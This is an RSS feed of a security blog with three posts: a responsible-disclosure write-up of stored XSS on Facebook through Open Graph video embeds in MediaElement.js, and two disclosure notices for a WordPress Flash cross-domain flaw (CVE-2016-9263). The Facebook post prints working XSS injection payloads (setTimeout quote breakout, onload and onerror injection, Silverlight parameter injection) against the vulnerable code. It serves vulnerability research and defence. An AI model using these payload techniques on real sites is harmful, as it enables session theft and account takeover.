<?xml version="1.0" encoding="UTF-8"?><rss version="2.0"
	xmlns:content="http://purl.org/rss/1.0/modules/content/"
	xmlns:wfw="http://wellformedweb.org/CommentAPI/"
	xmlns:dc="http://purl.org/dc/elements/1.1/"
	xmlns:atom="http://www.w3.org/2005/Atom"
	xmlns:sy="http://purl.org/rss/1.0/modules/syndication/"
	xmlns:slash="http://purl.org/rss/1.0/modules/slash/"
	
	xmlns:georss="http://www.georss.org/georss"
	xmlns:geo="http://www.w3.org/2003/01/geo/wgs84_pos#"
	>

<channel>
	<title>Uncategorized &#8211; OpnSec</title>
	<atom:link href="/category/uncategorized/feed/" rel="self" type="application/rss+xml" />
	<link></link>
	<description>Open mind Security and Crypto!</description>
	<lastBuildDate>Fri, 30 Jul 2021 20:07:09 +0000</lastBuildDate>
	<language>en-US</language>
	<sy:updatePeriod>
	hourly	</sy:updatePeriod>
	<sy:updateFrequency>
	1	</sy:updateFrequency>
	<generator>https://wordpress.org/?v=6.0.11</generator>

<image>
	<url>/wp-content/uploads/2017/08/cropped-opnsec-32x32.png</url>
	<title>Uncategorized &#8211; OpnSec</title>
	<link></link>
	<width>32</width>
	<height>32</height>
</image> 
<site xmlns="com-wordpress:feed-additions:1">250189475</site>	<item>
		<title>Stored XSS on Facebook</title>
		<link>/2018/03/stored-xss-on-facebook/?utm_source=rss&#038;utm_medium=rss&#038;utm_campaign=stored-xss-on-facebook</link>
					<comments>/2018/03/stored-xss-on-facebook/#comments</comments>
		
		<dc:creator><![CDATA[Engue Gillier]]></dc:creator>
		<pubDate>Sun, 18 Mar 2018 15:41:18 +0000</pubDate>
				<category><![CDATA[Uncategorized]]></category>
		<category><![CDATA[Facebook]]></category>
		<category><![CDATA[XSS]]></category>
		<guid isPermaLink="false">/?p=242</guid>

					<description><![CDATA[tl;dr; Stored XSSes in Facebook wall by embedding an external video with Open Graph. When a user clicks to play the video, the XSS executes on facebook.com Introduction I reported multiple stored XSS on Facebook wall in April 2017.Â These stored XSS vulnerabilities were also present in WordPress soÂ I waited for WordPress to patch it before&#8230; <a class="read-more" href="/2018/03/stored-xss-on-facebook/">Read More</a>]]></description>
										<content:encoded><![CDATA[<blockquote><p>tl;dr; Stored XSSes in Facebook wall by embedding an external video with Open Graph.</p>
<p>When a user clicks to play the video, the XSS executes on facebook.com</p></blockquote>
<h3>Introduction</h3>
<p>I reported multiple stored XSS on Facebook wall in April 2017.Â These stored XSS vulnerabilities were also present in WordPress soÂ I waited for WordPress to patch it before publishing this write-up. The vulnerabilities are now fixed on WordPress!</p>
<p>These XSS are a little bit complex because they require multiple steps, but each step by itself is pretty simple to understand.</p>
<p>&nbsp;</p>
<h3>The Open Graph protocol</h3>
<p>When you add a URL in a Facebook post, Facebook will use the <a href="http://ogp.me/">Open Graph protocol</a>Â (<a href="https://developers.facebook.com/docs/sharing/webmasters/" target="_blank" rel="noopener noreferrer">FB doc</a>) to display rich content. Â Here is a summary about how Facebook uses OG to embed external content in a FB post:</p>
<p>&nbsp;</p>
<ol>
<li>The attacker posts a URL on a FB post</li>
<li>FB server fetches the URL (server side) and reads the OG meta tags to extract info about the content of the URL (for example the content is a video with a title, a cover image, a video encoding type and a video file URL)</li>
<li>The victim views the FB post with the cover image and a play button</li>
<li>When the victim clicks on the play button, the video loads using the video info extracted from the OG meta tags. This is when the XSS will be executed</li>
</ol>
<p>&nbsp;</p>
<blockquote><p>This OG workflow is also used by many websites including Twitter and WordPress for example.<br />
Step #2 is sensitive: server-side fetching of a user provided URL, which can often lead to SSRF.<br />
Another potential vulnerability is Clickjacking if the hosting website uses X-Frame-Options: SAMEORIGIN on sensitive webpages and let the attacker inject arbitrary iframes on the same subdomain.</p>
<p>FB wasn&#8217;t vulnerable to either of these issues.</p></blockquote>
<p>The interesting part is #4 when FB loads the video after the victim clicks the play button. First, FB will send a XHR request to get the video type and the video file URL, which are both provided by the attacker in theÂ og:video:type (we&#8217;ll call it ogVideoType) and theÂ og:video:secure_url (ogVideoUrl) tags of the URL posted by the attacker. Here is a sample of OG meta tags:</p>
<pre><code ></p>
<p>&lt;!DOCTYPE html&gt;</p>
<p>&lt;html&gt;</p>
<p>&lt;head&gt;</p>
<p>&lt;meta property="og:video:type" content="video/flv"&gt;</p>
<p>&lt;meta property="og:video:secure_url" content='https://example.com/video.flv'&gt;</p>
<p>&lt;meta property="og:video:width" content="718"&gt;</p>
<p>&lt;meta property="og:video:height" content="404"&gt;</p>
<p>&lt;meta property="og:image" content="https://example.com/cover.jpg"&gt;</p>
<p>(...)</p>
<p>&lt;/head&gt;</p>
<p>&lt;body&gt;</p>
<p>(...)<br />
&lt;/body&gt;</p>
<p>&lt;/html&gt;</p>
<p></code></pre>
<p>IfÂ ogVideoType is &#8220;iframe&#8221; or &#8220;swf player&#8221; then FB loads an external iframe and doesn&#8217;t handle the playing of the video. Otherwise, FB was using <a href="http://www.mediaelementjs.com/">MediaElement.js</a> to handle the loading of the video directly on facebook.com. I already reported and <a href="/2017/10/flashme-wordpress-vulnerability-disclosure-cve-2016-9263/">disclosed vulnerabilities</a>Â on the Flash component of ME.js on both Facebook and WordPress.</p>
<p>&nbsp;</p>
<h2>1. Stored XSS using FlashMediaElement.swf</h2>
<p>MediaElements.js has multiple ways of playing a video depending on ogVideoType.</p>
<p>If ogVideoType is &#8220;video/flv&#8221; (flash video), Facebook loads the Flash file FlashMediaElement.swf on facebook.comÂ  (using an &lt;embed&gt; tag) and passes the ogVideoUrl to FlashME.swf to play the video. FlashME.swf then sends logs information to facebook.com (using Flash-to-javascript) about events like &#8220;video played&#8221; or &#8220;video ended&#8221;.Â FlashME.swf handled correctly the Flash-to-javascript communication, in particular <strong>\</strong> was properly escaped to <strong>\\</strong> to avoid XSS.</p>
<p>However, the javascript code sent was :</p>
<pre><code >setTimeout('log("[VIDEO_URL]")', 0)</code></pre>
<blockquote><p>In javascript setTimeout is similar to eval, it will transform a string into instructions, making it very dangerous</p></blockquote>
<p>[VIDEO_URL] is controlled by the attacker, it&#8217;s the value of ogVideoUrl. If it contains <strong>&#8220;</strong> for example <pre><code >http://evil.com/video.flv?"[payload]</code></pre> Flash will send the following instruction to javascript:</p>
<pre><code >setTimeout("log(\"http://evil.com/video.flv?\"payload\")", 0);</code></pre>
<p>As you can see, the <strong>&#8220;</strong> in <strong>video.flv?\&#8221;payload</strong> is properly escaped so the attacker cannot escape from the setTimeout function.</p>
<p>However, when javascript executes the setTimeout function, it will execute the following javascript instruction :</p>
<pre><code >log("http://evil.com/video.flv?"[payload]")</code></pre>
<p>And this time <strong>&#8220;</strong> is not escaped any more and the attacker can inject XSS!</p>
<p>Now the question is whether Facebook escapes ogVideoUrl before passing it to FlashME.swf.</p>
<p>First, Facebook javascript sends a XHR request to Facebook server to get the value of ogVideoType and ogVideoUrl. The value ofÂ ogVideoUrl is correctly encoded but it can contain any special character like <pre><code >https://evil.com?"'&lt;\</code></pre></p>
<p>Then, before being sent to Flash, ogVideoUrl was transformed like this :</p>
<pre><code >function absolutizeUrl(<span class="objectBox objectBox-text " role="presentation">ogVideoUrl</span>) {<br />
var tempDiv = document.createElement('div');<br />
tempDiv.innerHTML = '&lt;a href="' + <span class="objectBox objectBox-text " role="presentation">ogVideoUrl</span>.toString().split('"').join('&amp;quot;') + '"&gt;x&lt;/a&gt;';<br />
return tempDiv.firstChild.href;<br />
}</p>
<p>flashDiv.innerHTML ='&lt;embed src="FlashME.swf?videoFile=' +Â <span class="objectBox objectBox-text " role="presentation">encodeURI(absolutizeUrl(ogVideoUrl )) +'</span>" type="application/x-shockwave-flash"&gt;';</p>
<p></code></pre>
<p>The result ofÂ <span class="objectBox objectBox-text " role="presentation">absolutizeUrl(ogVideoUrl) is URL encoded before being sent to Flash but when Flash will receive the data it will automatically URL decode it once, so we can ignore theÂ encodeURI instruction.</span></p>
<p><span class="objectBox objectBox-text " role="presentation">absolutizeUrl t</span>ransforms relative URL to absolute URL with the current protocol and domain of the javascript context (and if anÂ absolute URL is provided, it returns it almost unchanged). This seems &#8220;hacky&#8221; but it seems secure enough and simple because we let the browser do the hard work. But it&#8217;s not simple when it comes to special character encoding!</p>
<p>When initially analyzing this code, I was using Firefox, because it had great extensions like Hackbar, Tamper Data and&#8230; Firebug!</p>
<p>In Firefox, if you tryÂ <pre><code >absolutizeUrl('http://evil.com/video.flv#"payload')</code></pre> it will returnÂ <pre><code >http://evil.com/video.flv#%22payload</code></pre> so I was stuck because in Facebook the javascript instruction sent by Flash would beÂ <pre><code >setTimeout("log(\"http://evil.com/video.flv?%22payload\")", 0);</code></pre> which will lead toÂ <pre><code >log("http://evil.com/video.flv?%22[payload]")</code></pre> which is NOT an XSS.</p>
<p>&nbsp;</p>
<p>And then I tried on Chrome and <pre><code >absolutizeUrl('http://evil.com/video.flv#"payload')</code></pre> returnedÂ <pre><code >http://evil.com/video.flv#"payload</code></pre> and <strong>\o/ YEAH!!!!!</strong></p>
<p>Now Flash sends <pre><code >setTimeout("log(\"http://evil.com/video.flv?\"payload\")", 0);</code></pre> to Facebook javascript and which will lead toÂ <pre><code >log("http://evil.com/video.flv?"[payload]")</code></pre></p>
<p>So if ogVideoUrl is set toÂ <pre><code >http://evil.com/video.flv#"+alert(document.domain+" XSSed!")+"</code></pre> then Facebook will executeÂ <pre><code >log("http://evil.com/video.flv?"+alert(document.domain+" XSSed!")+"") </code></pre> and will display a nice little alert box saying &#8220;facebook.com XSSed!&#8221; <img src="https://s.w.org/images/core/emoji/14.0.0/72x72/1f642.png" alt="ðŸ™‚" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p>
<blockquote><p>The reason of this is that when a browser parses a URL, it will encode special characters differently depending on the browser:</p>
<ul>
<li>Firefox will URLencode any occurence of <strong>&#8220;</strong> in the url</li>
<li>Chrome, up to version 64, would URLencode <strong>&#8220;</strong> EXCEPT in the hash part (= fragment) of the URL (note: in the latest version 65 of Chrome, this behaviour changed and now Chrome behaves like Firefox and will URLencode &#8221; even in the hash part</li>
<li>IE and Edge will NOT URLencode <strong>&#8220;</strong> in the hash part NOR the search part (= query) of the URL</li>
<li>Safari willÂ NOT URLencode <strong>&#8220;</strong> in the hash part</li>
</ul>
<p>As you can see it&#8217;s not great to let the browser decide how to encode special characters in URLs in your javascript code!</p></blockquote>
<p>I reported the vulnerability right away to Facebook and they replied the next day and told me they modified the Flash file so that it doesn&#8217;t useÂ setTimeout any more,Â  the Flash would now sendÂ <pre><code >log("http://evil.com/video.flv?\"payload")</code></pre> and as you can see <strong>&#8220;</strong> is properly escaped to <strong>\&#8221;</strong> and there is no XSS any more.</p>
<p>&nbsp;</p>
<h2>2. Stored XSS without Flash</h2>
<p>The previous XSS required Flash so I checked if I could find another payload without Flash.</p>
<p>If ogVideoType was &#8220;video/vimeo&#8221;, the following code would execute</p>
<pre><code ><span class="objectBox objectBox-text " role="presentation">ogVideoUrl </span>=Â <span class="objectBox objectBox-text " role="presentation">absolutizeUrl(ogVideoUrl);</span></p>
<p><span class="objectBox objectBox-text " role="presentation">ogVideoUrl = ogVideoUrl.substr(ogVideoUrl.lastIndexOf('/') + 1);</span></p>
<p>playerDiv.innerHTMLÂ = '&lt;iframe src="https://player.vimeo.com/video/' + <span class="objectBox objectBox-text " role="presentation">ogVideoUrl </span>+ '?api=1"&gt;&lt;/iframe&gt;';</p>
<p></code></pre>
<p>As you can seeÂ <span class="objectBox objectBox-text " role="presentation">absolutizeUrl(ogURL) is not urlencoded before being injected toÂ playerDiv.innerHTML, so with ogVideoUrl set to <pre><code >http://evil.com/#" onload="alert(document.domain)"</code></pre>Â playerDiv.innerHTML would beÂ <pre><code >&lt;iframe src="https://player.vimeo.com/video/#" onload="alert(document.domain)" ?api=1"&gt;&lt;/iframe&gt; </code></pre></span></p>
<p><span class="objectBox objectBox-text " role="presentation">which is again an XSS on facebook.com!</span></p>
<p>&nbsp;</p>
<p>I reported this on the same day the previous XSS was fixed and Facebook fixed it again in 1 day like this :</p>
<p><span class="objectBox objectBox-text " role="presentation"><pre><code ></span></p>
<p><span class="objectBox objectBox-text " role="presentation">ogVideoUrl </span>=Â <span class="objectBox objectBox-text " role="presentation">absolutizeUrl(ogVideoUrl);</span></p>
<p><span class="objectBox objectBox-text " role="presentation">ogVideoUrl = ogVideoUrl.substr(ogVideoUrl.lastIndexOf('/') + 1);</span></p>
<p>playerDiv.innerHTMLÂ = '&lt;iframe src="https://player.vimeo.com/video/' + <span class="objectBox objectBox-text " role="presentation">ogVideoUrl</span><span class="objectBox objectBox-text " role="presentation">.split('"').join('&amp;quot;')</span>Â + '?api=1"&gt;&lt;/iframe&gt;'</p>
<p><span class="objectBox objectBox-text " role="presentation"></code></pre></span></p>
<p>Here is a video of this XSS in action :</p>
<div class="jetpack-video-wrapper"><iframe loading="lazy" title="Facebook XSS" width="1170" height="658" src="https://www.youtube.com/embed/Q9bsKjUd1hM?feature=oembed" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe></div>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>The next day, I found another vulnerable endpoint: when ogVideoType was something unknown, like &#8220;video/nothing&#8221;, Facebook would display an error message with a link to <span class="objectBox objectBox-text " role="presentation">ogVideoUrl </span> like this:</p>
<p><span class="objectBox objectBox-text " role="presentation"><pre><code ></span>errorDiv.innerHTMLÂ = '&lt;a href="' +<span class="objectBox objectBox-text " role="presentation">absolutizeUrl(ogVideoUrl )</span> + '"&gt;'<span class="objectBox objectBox-text " role="presentation"></code></pre></span></p>
<p>So with the <span class="objectBox objectBox-text " role="presentation">ogVideoUrlÂ </span>payloadÂ <span class="objectBox objectBox-text " role="presentation"><pre><code ></span>/#"&gt;&lt;img/src="xxx"onerror="alert(document.domain)<span class="objectBox objectBox-text " role="presentation"></code></pre></span>Â errorDiv.innerHTML would beÂ <span class="objectBox objectBox-text " role="presentation"><pre><code ></span>&lt;a href="/#"&gt;&lt;img src="xxx" onerror="alert(document.domain)"&gt;<span class="objectBox objectBox-text " role="presentation"></code></pre></span></p>
<p>&nbsp;</p>
<p>I reported it to Facebook and, funny enough, Neil from Facebook WhiteHat told me he was planning to check this code the next day!</p>
<p>&nbsp;</p>
<h2>3. Oh, and one more thing&#8230;</h2>
<p>Another possible ogVideoType was &#8220;silverlight&#8221;. <a href="https://www.microsoft.com/silverlight/">Silverlight</a>Â is a browser plugin by Microsoft and is to Flash what VBscript was to javascript.</p>
<p>The silverlight file hosted on Facebook (silverlightmediaelement.xap) was loaded like this:</p>
<p><span class="objectBox objectBox-text " role="presentation"><pre><code ></span></p>
<p>params = ["file=" + <span class="objectBox objectBox-text " role="presentation">ogVideoUrl</span><span class="objectBox objectBox-text " role="presentation">, "id=playerID"</span>];</p>
<p>silverlightDiv.innerHTML ='&lt;object data="data:application/x-silverlight-2," type="application/x-silverlight-2"&gt;&lt;param name="initParams" value="' + params.join(',').split('"').join('&amp;quot;') + '" /&gt;&lt;/object&gt;';</p>
<p><span class="objectBox objectBox-text " role="presentation"></code></pre></span></p>
<p>silverlightmediaelement.xapÂ would then send log information to Facebook javascript a little bit like the Flash file did, but this time it didn&#8217;t contain <span class="objectBox objectBox-text " role="presentation">ogVideoUrl</span> but only the player id, which is another parameter sent inÂ initParams and defined by Facebook. Silverlight would call the javascript function <strong>[id]_init()</strong>Â where [id] is &#8220;playerID&#8221;.</p>
<p>InÂ silverlight, parameters are not separated by <strong>&amp;</strong>Â like in urls or in Flash but by <strong>,</strong></p>
<p>If <span class="objectBox objectBox-text " role="presentation">ogVideoUrlÂ </span>contains a <strong>,</strong> then every thing after this comma will be considered as another parameter by silverlight, which means that using the payloadÂ  <span class="objectBox objectBox-text " role="presentation"><pre><code ></span>/#,id=alert(document.domain)&amp; <span class="objectBox objectBox-text " role="presentation"></code></pre></span> then silverlight be loaded like this:</p>
<p><span class="objectBox objectBox-text " role="presentation"><pre><code ></span>silverlightDiv.innerHTML ='&lt;object data="data:application/x-silverlight-2," type="application/x-silverlight-2"&gt;&lt;param name="initParams" value="file=/#,id=alert(document.domain)&amp;,id=playerID" /&gt;&lt;/object&gt;'; <span class="objectBox objectBox-text " role="presentation"></code></pre></span></p>
<p>Silverlight will only take into account the first occurence of id and it will set its value toÂ  <span class="objectBox objectBox-text " role="presentation"><pre><code ></span>alert(document.domain)&amp; <span class="objectBox objectBox-text " role="presentation"></code></pre></span></p>
<p>Silverlight will then call the following javascript :Â  <span class="objectBox objectBox-text " role="presentation"><pre><code ></span>alert(document.domain)&amp;_init() <span class="objectBox objectBox-text " role="presentation"></code></pre></span> which means XSS again!</p>
<p>&nbsp;</p>
<p>I reported it the same day and Neal replied that they would remove all the MediaElement component and replace it with a new way of handling external videos!</p>
<p>&nbsp;</p>
<h2>What about WordPress ?</h2>
<p>All this vulnerable code wasn&#8217;t developed by Facebook, they used an open source libraryÂ <a href="http://www.mediaelementjs.com/">MediaElementjs</a>Â which was (and still is) a popular module to embed video in a webpage, especially because they had a Flash fallback for older browsers. In particular, WordPress uses this module by default when handling <a href="https://codex.wordpress.org/Shortcode_API">shortcodes</a>. The vulnerabilities were also present in WordPress and allowed stored XSS in WordPress comments or in WordPress articles written by authors (in WordPress, the Author role isn&#8217;t allowed to execute javascript).</p>
<p>I reported the vulnerabilities to WordPress to which I already reported <a href="/2017/10/flashme-wordpress-vulnerability-disclosure-cve-2016-9263/">another vulnerability</a>Â monthes before. They informed MediaElementjs team about this and told me they were working on a fix. On February 2018 they finally released the fix for all the XSS related to MediaElementjs.</p>
<p>&nbsp;</p>
<h2>Conclusion</h2>
<p>I learned a lot and had a lot of fun finding these vulnerabilities. I hope you also enjoy it!</p>
<p>Here is some advices :</p>
<blockquote><p>Open Graph (and alternatives like json-ld) is a great way to display rich external content on a website, but you should be careful about it (think SSRF, XSS and Clickjacking)</p>
<p>Don&#8217;t let the browser parse URL for you in your javascript code, each browser handles it his own way and a browser can change its behavior anytime (like Chrome 64 -&gt; 65). Use white-list regex instead.</p>
<p>Complex, dynamic XSSes that use XHR, DOM mutations, and external content will NOT be detected by automatic tools (for now). So even the most secure, high profile website can be vulnerable. Code review and debugging are the way to go for these!</p>
<p>Don&#8217;t be afraid of large, minified, dynamic javascript source code. If you spot some potentially dangerous features on a website, you&#8217;re free to check how it is implemented!</p>
<p>Facebook WhiteHat is a great Bug Bounty program! Thanks Neal and all the team <img src="https://s.w.org/images/core/emoji/14.0.0/72x72/1f642.png" alt="ðŸ™‚" class="wp-smiley" style="height: 1em; max-height: 1em;" /></p></blockquote>
<p>Thanks for reading, and feel free to comment if something isn&#8217;t clear.</p>
<p>&nbsp;</p>
<p>Happy hunting !</p>

<div class="twitter-share"><a href="https://twitter.com/intent/tweet?url=https%3A%2F%2Fopnsec.com%2F2018%2F03%2Fstored-xss-on-facebook%2F&#038;via=opnsec" class="twitter-share-button">Tweet</a></div>
]]></content:encoded>
					
					<wfw:commentRss>/2018/03/stored-xss-on-facebook/feed/</wfw:commentRss>
			<slash:comments>2</slash:comments>
		
		<enclosure url="https://example.com/video.flv" length="606" type="video/x-flv" />
<enclosure url="http://evil.com/video.flv?" length="863" type="video/x-flv" />
<enclosure url="http://evil.com/video.flv?" length="863" type="video/x-flv" />
<enclosure url="http://evil.com/video.flv#" length="863" type="video/x-flv" />
<enclosure url="http://evil.com/video.flv#%22payload" length="863" type="video/x-flv" />
<enclosure url="http://evil.com/video.flv?" length="863" type="video/x-flv" />
<enclosure url="http://evil.com/video.flv?" length="863" type="video/x-flv" />
<enclosure url="http://evil.com/video.flv?" length="863" type="video/x-flv" />
<enclosure url="http://evil.com/video.flv?" length="863" type="video/x-flv" />
<enclosure url="http://evil.com/video.flv?" length="863" type="video/x-flv" />
<enclosure url="http://evil.com/video.flv?" length="863" type="video/x-flv" />
<enclosure url="http://evil.com/video.flv?" length="863" type="video/x-flv" />
<enclosure url="http://evil.com/video.flv?" length="863" type="video/x-flv" />
<enclosure url="http://evil.com/video.flv?" length="863" type="video/x-flv" />
<enclosure url="http://evil.com/video.flv?" length="867" type="video/x-flv" />
<enclosure url="http://evil.com/video.flv?" length="867" type="video/x-flv" />
<enclosure url="http://evil.com/video.flv?%22payload" length="867" type="video/x-flv" />

		<post-id xmlns="com-wordpress:feed-additions:1">242</post-id>	</item>
		<item>
		<title>FlashME! &#8211; WordPress vulnerability disclosure [CVE-2016-9263]</title>
		<link>/2017/10/flashme-wordpress-vulnerability-disclosure-cve-2016-9263/?utm_source=rss&#038;utm_medium=rss&#038;utm_campaign=flashme-wordpress-vulnerability-disclosure-cve-2016-9263</link>
					<comments>/2017/10/flashme-wordpress-vulnerability-disclosure-cve-2016-9263/#comments</comments>
		
		<dc:creator><![CDATA[Engue Gillier]]></dc:creator>
		<pubDate>Thu, 19 Oct 2017 12:27:10 +0000</pubDate>
				<category><![CDATA[Uncategorized]]></category>
		<guid isPermaLink="false">/?p=220</guid>

					<description><![CDATA[Last week, I disclosed the existence of an unpatched Flash vulnerability on WordPress (/2017/10/cve-2016-9263-unpatched-xsf-vulnerability-in-wordpress/). Today, I disclose technical details about this vulnerability. However, contrary to what I announced before, I won&#8217;t provide a POC nor enough technical details to allow attackers to exploit it. Responsible disclosure of unpatched vulnerabilities is never easy, and I&#8217;m trying&#8230; <a class="read-more" href="/2017/10/flashme-wordpress-vulnerability-disclosure-cve-2016-9263/">Read More</a>]]></description>
										<content:encoded><![CDATA[<p><img loading="lazy" class="alignnone size-thumbnail wp-image-235" style="display: none;" src="/wp-content/uploads/2017/10/FlashMEcropped-150x150.png" alt="" width="150" height="150" />Last week, I disclosed the existence of an unpatched Flash vulnerability on WordPress (<a href="/2017/10/cve-2016-9263-unpatched-xsf-vulnerability-in-wordpress/">/2017/10/cve-2016-9263-unpatched-xsf-vulnerability-in-wordpress/</a>). Today, I disclose technical details about this vulnerability. However, contrary to what I announced before, I won&#8217;t provide a POC nor enough technical details to allow attackers to exploit it. Responsible disclosure of unpatched vulnerabilities is never easy, and I&#8217;m trying to do this right both ethically and legally.</p>
<p>If you want to know more about the type of vulnerability, the impact and how to patch it please refer to <a href="/2017/10/cve-2016-9263-unpatched-xsf-vulnerability-in-wordpress/">/2017/10/cve-2016-9263-unpatched-xsf-vulnerability-in-wordpress/</a>.</p>
<h3>Technical details</h3>
<p>WordPress uses an independent open-source tool to play videos in a webpage, MediaElement.js. ME.js provides a Flash fallback for browsers that don&#8217;t support the &lt;video&gt; tag or certain video codecs, using the flash file FlashMediaElement.swf. Vulnerabilities on this file have been reported in the past, like the awesome Flash based XSS found by <a href="https://twitter.com/cure53berlin" target="_blank" rel="noopener noreferrer">cure53</a> <a href="https://gist.github.com/cure53/df34ea68c26441f3ae98f821ba1feb9c">https://gist.github.com/cure53/df34ea68c26441f3ae98f821ba1feb9c</a>.</p>
<p>While investigating the source of this file in summer 2016, one particular instruction catched my attention</p>
<pre><code >Security.allowDomain("www.[XYZ].com");</code></pre>
<blockquote><p>Note: I changed the real name of the domain to [XYZ].com</p></blockquote>
<p><a href="http://help.adobe.com/en_US/FlashPlatform/reference/actionscript/3/flash/system/Security.html#allowDomain()" target="_blank" rel="noopener noreferrer">Security.allowDomain()</a> can be described as a vulnerable function: using it will downplay the <a href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy" target="_blank" rel="noopener noreferrer">Same-Origin Policy</a> which is the basis of website client-side security. You can read more about Flash security sandbox model <a href="http://www.senocular.com/flash/tutorials/contentdomains/" target="_blank" rel="noopener noreferrer">here</a>.</p>
<p>This code will allow a Flash file hosted on [XYZ].com to execute code on the FlashMediaElement.swf file, which is hosted on the WordPress site domain. [XYZ].com is a very well established company, so you could safely think that they would not use this privilege to execute malicious code on your website, the same way you would allow Google Analytics or Youtube to run scripts on your website. However, it is not that simple. With Security.allowDomain(&#8220;www.[XYZ].com&#8221;), you allow not only one specific file hosted on [XYZ].com to access your Flash security sandbox but any Flash file hosted on [XYZ].com.</p>
<blockquote><p>Quick reminder about <a href="https://www.owasp.org/index.php/Cross-site_Scripting_(XSS)" target="_blank" rel="noopener noreferrer">Cross-Site Scripting</a>:Â XSS is the ability to execute arbitrary code (script, in this case Flash ActionScript3) in an external website. Not only a XSS allows you to access private info (like cookies) and private functions (like xhr requests) on the external website, but the arbitrary code will also be considered by the browser (or the Flash player) to be originating from the vulnerable website. This subtlety is what we will exploit here.</p></blockquote>
<p>The thing is that [XYZ].com is vulnerable itself to XSS, or in this case Cross-Site Flashing. Which means that an attacker can execute arbitrary Flash code that will be considered by the Flash player as being originating from [XYZ].com. This forms a chain of vulnerabilities that will end up with any WordPress website being vulnerable to Cross-Site Flashing. Let&#8217;s make a drawing:</p>
<p><a href="/wp-content/uploads/2017/10/FlashME.svg"><img loading="lazy" class="wp-image-228 aligncenter" src="/wp-content/uploads/2017/10/FlashME.svg" alt="" width="969" height="485" /></a></p>
<p>&nbsp;</p>
<h3>Facebook was vulnerable, too</h3>
<p>A few months after reporting this issue, I was investigating various Flash files on facebook.com. One file contained the following instruction:</p>
<pre><code >Security.allowDomain("www.[XYZ].com");</code></pre>
<p>Facebook was using a file similar to flashmediaelement.swf to embed external videos on Facebook wall. The same vulnerability was present in this file and I was able to create various POC exploits using this vulnerability that would lead to Facebook OAuth bypass and even Facebook account takeover without user interaction.</p>
<p>I reported the issue to <a href="https://www.facebook.com/whitehat" target="_blank" rel="noopener noreferrer">Facebook WhiteHat </a>program and Facebook Security Team quickly fixed the issue and generously rewarded me.</p>
<h3>Conclusion</h3>
<p>This vulnerability is complex because it relies on multiple factors, technologies and companies. However, once an attacker is able to create an exploit, exploiting this vulnerability is easy because all of the requirements are usually present by default on a system. This vulnerability not only affects WordPress websites, but every websites hosted on the same subdomain as a WordPress website.</p>
<p>I hope WordPress will patch this issue soon and that my report will help raise awareness about Chained XSS vulnerabilities. Thanks for reading!</p>

<div class="twitter-share"><a href="https://twitter.com/intent/tweet?url=https%3A%2F%2Fopnsec.com%2F2017%2F10%2Fflashme-wordpress-vulnerability-disclosure-cve-2016-9263%2F&#038;via=opnsec" class="twitter-share-button">Tweet</a></div>
]]></content:encoded>
					
					<wfw:commentRss>/2017/10/flashme-wordpress-vulnerability-disclosure-cve-2016-9263/feed/</wfw:commentRss>
			<slash:comments>3</slash:comments>
		
		
		<post-id xmlns="com-wordpress:feed-additions:1">220</post-id>	</item>
		<item>
		<title>[CVE-2016-9263] XSF vulnerability in WordPress [UPDATED]</title>
		<link>/2017/10/cve-2016-9263-unpatched-xsf-vulnerability-in-wordpress/?utm_source=rss&#038;utm_medium=rss&#038;utm_campaign=cve-2016-9263-unpatched-xsf-vulnerability-in-wordpress</link>
					<comments>/2017/10/cve-2016-9263-unpatched-xsf-vulnerability-in-wordpress/#comments</comments>
		
		<dc:creator><![CDATA[Engue Gillier]]></dc:creator>
		<pubDate>Thu, 12 Oct 2017 14:28:34 +0000</pubDate>
				<category><![CDATA[Uncategorized]]></category>
		<guid isPermaLink="false">/?p=209</guid>

					<description><![CDATA[Please patch this issue on your WordPress websites immediately and ask WordPress to release a patched version before I publicly release technical details about this on Oct 19th 2017 What is the vulnerability ? There is an unpatched vulnerability in latest and older WordPress releases. The vulnerability is a cross-domain Flash injection (XSF), which impact&#8230; <a class="read-more" href="/2017/10/cve-2016-9263-unpatched-xsf-vulnerability-in-wordpress/">Read More</a>]]></description>
										<content:encoded><![CDATA[<h3><img loading="lazy" class="wp-image-213 aligncenter" src="/wp-content/uploads/2017/10/wordpress-vulnerable-1.jpg" alt="" width="528" height="276" srcset="/wp-content/uploads/2017/10/wordpress-vulnerable-1.jpg 905w, /wp-content/uploads/2017/10/wordpress-vulnerable-1-300x157.jpg 300w, /wp-content/uploads/2017/10/wordpress-vulnerable-1-768x401.jpg 768w" sizes="(max-width: 528px) 100vw, 528px" /></h3>
<h5><strong>Please patch this issue on your WordPress websites immediately and ask WordPress to release a patched version before I publicly release technical details about this on Oct 19th 2017</strong></h5>
<h3>What is the vulnerability ?</h3>
<p>There is an <strong>unpatched vulnerability in latest and older WordPress releases</strong>. The vulnerability is a cross-domain Flash injection (<strong>XSF</strong>), which impact is <strong>similar to a Reflected XSS</strong> (or Same-Origin policy bypass).<br />
The vulnerable file is located at /wp-includes/js/mediaelement/<strong>flashmediaelement.swf</strong>.</p>
<h3>Who is affected ?</h3>
<p>Any up-to-date or older (for at least 2 years) version of WordPress is vulnerable by default. <strong>Every WordPress website is vulnerable</strong> to this as well as <strong>any other website hosted on the same subdomain</strong> as a WordPress website.</p>
<p>The only WordPress websites that are not affected are those where the vulnerable file, flashmediaelement.swf, is hosted on a sandboxed domain. This is the case for sites hosted on wordpress.com for example.</p>
<h3>What is the impact ?</h3>
<p>The impact is similar to an (authenticated) Reflected XSS, except you can&#8217;t manipulate the DOM and read some values like header responses, and the victim must have Flash active. The attacker can send a malicious link that would execute arbitrary Flash code on the WordPress security sandbox. When a victim opens the malicious link, the attacker can perform &#8220;xhr style&#8221; requests with Flash to any URL in the WordPress domain, using the victim&#8217;s cookies. Attacker can then read the response source code (body) and steal the victims private info including any CSRF token. He can use the CSRF token to perform CSRF actions on behalf of the user. In the case of Facebook for example, this led to Facebook account takeover after the victim clicked on the malicious link.</p>
<p>Because this is a Same-Origin policy bypass, the attacker can exploit this not only on the vulnerable WordPress site but also on any website located in the same subdomain (or same Origin) than the vulnerable WordPress site.</p>
<h3>How to patch this ?</h3>
<p>WordPress decided not to patch this issue for some (bad?) reasons. You should simply <strong>remove the vulnerable file</strong> at [WordPress_Home_URL]/wp-includes/js/mediaelement/flashmediaelement.swf (which is just a Flash fallback for embed videos not hosted on a streaming website).</p>
